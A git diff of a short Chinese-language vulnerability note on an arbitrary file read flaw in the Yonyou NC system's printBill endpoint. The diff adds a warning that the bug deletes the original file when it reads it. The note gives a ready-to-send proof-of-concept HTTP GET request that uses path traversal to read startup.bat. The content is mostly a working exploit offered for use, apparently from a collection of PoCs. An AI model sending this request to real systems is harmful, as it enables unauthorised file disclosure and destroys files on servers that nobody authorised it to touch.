@@ -1,5 +1,7 @@
 ## 用友NC系统printBill接口存在任意文件读取漏洞
 
+`注意：这个漏洞在读取文件的时候，会将原来的文件删除，谨慎使用。`
+
 ## poc
 ```
 GET /portal/pt/printpdf/printBill?pageId=login&filePath=../../startup.bat HTTP/1.1
